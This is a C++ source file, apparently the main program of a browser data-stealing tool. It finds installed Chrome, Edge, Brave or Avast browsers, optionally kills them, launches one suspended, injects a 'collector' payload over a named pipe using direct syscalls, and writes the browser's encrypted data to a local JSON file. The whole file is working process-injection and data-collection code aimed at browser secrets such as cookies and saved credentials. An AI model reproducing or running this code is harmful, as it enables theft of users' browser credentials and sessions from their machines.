// collector_main.cpp – Phase 1 injector (collects encrypted data)
#include "../core/common.hpp"
#include "../core/console.hpp"
#include "../sys/internal_api.hpp"
#include "../injector/browser_discovery.hpp"
#include "../injector/browser_terminator.hpp"
#include "../injector/process_manager.hpp"
#include "../injector/pipe_server.hpp"
#include "../injector/injector.hpp"
#include <fstream>
#include <nlohmann/json.hpp>

using namespace Injector;
using json = nlohmann::json;

int wmain(int argc, wchar_t* argv[]) {
    bool verbose = false;
    bool killBrowsers = false;
    std::wstring targetType;
    std::filesystem::path output = std::filesystem::current_path() / "output";

    Core::Console console(false);

    for (int i = 1; i < argc; ++i) {
        std::wstring arg = argv[i];
        if (arg == L"--verbose" || arg == L"-v") verbose = true;
        else if (arg == L"--kill" || arg == L"-k") killBrowsers = true;
        else if (arg == L"--target" || arg == L"-t") {
            if (i + 1 < argc) targetType = argv[++i];
        }
        else if (arg == L"--output" || arg == L"-o") {
            if (i + 1 < argc) output = argv[++i];
        }
    }

    // Initialize syscalls for injector
    if (!Sys::InitApi(verbose)) {
        console.Error("Syscall initialization failed");
        return 1;
    }

    // Find all browsers (static method)
    auto browsers = BrowserDiscovery::FindAll();
    if (browsers.empty()) {
        console.Warn("No supported browsers found. Check that at least one of Chrome, Edge, Brave, or Avast is installed.");
        return 0;
    }

    // Filter by target if specified
    if (!targetType.empty()) {
        std::vector<BrowserInfo> filtered;
        for (auto& b : browsers) {
            if (b.type == targetType) filtered.push_back(b);
        }
        browsers = filtered;
        if (browsers.empty()) {
            console.Error("Target browser not found: " + Core::ToUtf8(targetType));
            return 1;
        }
    }

    for (const auto& browser : browsers) {
        console.BrowserHeader(browser.displayName, browser.version);
        try {
            if (killBrowsers) {
                console.Debug("Terminating browser processes...");
                BrowserTerminator terminator(console);
                TerminationOptions opts;
                opts.terminateChildren = true;
                opts.waitForExit = true;
                terminator.KillByExeName(browser.exeName, opts);
                Sleep(300);
            }

            console.Debug("Creating suspended process: " + Core::ToUtf8(browser.fullPath));
            ProcessManager procMgr(browser);
            procMgr.CreateSuspended();
            console.Debug(" [+] Process created (PID: " + std::to_string(procMgr.GetPid()) + ")");

            PipeServer pipe(browser.type);
            pipe.Create();
            console.Debug(" [+] IPC pipe: " + Core::ToUtf8(pipe.GetName()));

            PayloadInjector injector(procMgr, console);
            injector.Inject(pipe.GetName());        // injects COLLECTOR payload

            console.Debug("Awaiting payload connection...");
            pipe.WaitForClient();
            console.Debug(" [+] Payload connected");

            pipe.SendConfig(verbose, false, output);
            pipe.ProcessMessages(verbose);

            procMgr.Terminate();
            console.Success("Encrypted data saved to " + (output / "encrypted.json").string());
        }
        catch (const std::exception& e) {
            console.Error(std::string(e.what()));
        }
    }

    return 0;
}
